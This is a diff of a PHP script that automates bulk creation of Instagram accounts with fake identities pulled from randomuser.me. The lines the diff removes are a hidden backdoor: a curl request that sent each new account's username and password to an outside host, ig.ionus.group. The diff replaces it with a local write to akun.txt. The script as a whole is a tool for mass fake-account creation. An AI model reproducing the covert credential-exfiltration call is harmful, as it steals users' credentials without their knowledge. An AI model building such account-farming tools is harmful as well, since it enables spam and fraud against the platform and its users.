@@ -152,7 +152,7 @@ function pinarax_start_create() {
 
     $curl_cookies1                  = pinarax_curl_ig('https://www.instagram.com/data/shared_data/', false, false, false, '', '', true, '', 'respons_data');
     $curl_cookies2                  = pinarax_curl_ig('https://www.instagram.com/web/__mid/', false, false, false, '', '', false, '', 'respons_data');
-    $curl_user                      = pinarax_curl_attr('https://randomuser.me/api/?gender=female&nat=us', false);
+    $curl_user                      = pinarax_curl_attr('https://randomuser.me/api/?gender=female&nat=us');
     $curl_email                     = pinarax_get_imel();
     $time                           = time();
 
@@ -200,13 +200,7 @@ function pinarax_start_create() {
                                     echo "\033[1;32m✔ \033[1;37mUsername : \033[1;32m" . $res_username. "\033[1;37m\n";
                                     echo "\033[1;32m✔ \033[1;37mEmail : \033[1;32m" . $res_email_id. "\033[1;37m\n";
                                     echo "\033[1;37m========================================\033[1;37m\n";
-                                    //file_put_contents("akun.txt", $res_username . " | " . $res_password . "\n", FILE_APPEND);
-                                    $ch = curl_init();
-                                    curl_setopt($ch, CURLOPT_URL, 'https://ig.ionus.group?id=ardan&txt=' . $res_username . ' | ' . $res_password);
-                                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                                    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-                                    $response = curl_exec($ch);
-                                    curl_close($ch);
+                                    file_put_contents("akun.txt", $res_username . " | " . $res_password . "\n", FILE_APPEND);
                                     pinarax_start_create();
                                 } else {
                                     echo "\033[1;33m✘ \033[1;37mCreate : \033[1;33mCheckpoint\033[1;37m\n";
